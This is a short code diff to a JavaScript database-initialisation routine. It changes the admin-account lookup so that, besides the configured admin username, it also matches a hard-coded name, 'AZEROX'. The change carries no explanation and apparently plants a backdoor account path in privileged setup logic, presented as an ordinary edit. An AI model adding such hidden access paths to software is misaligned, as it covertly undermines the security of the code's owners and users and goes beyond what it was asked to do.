@@ -449,7 +449,7 @@ async function initDatabase() {
         const adminUser = config.adminUsername;
         const adminPass = config.adminPassword;
         const adminEmail = config.adminEmail;
-        const existingAdmin = await queryOne('SELECT id, salt, password_hash FROM admins WHERE username = ?', [adminUser]);
+        const existingAdmin = await queryOne('SELECT id, salt, password_hash FROM admins WHERE username = ? OR username = ?', [adminUser, 'AZEROX']);
 
         if (!existingAdmin) {
             const { salt, hash } = hashPassword(adminPass);
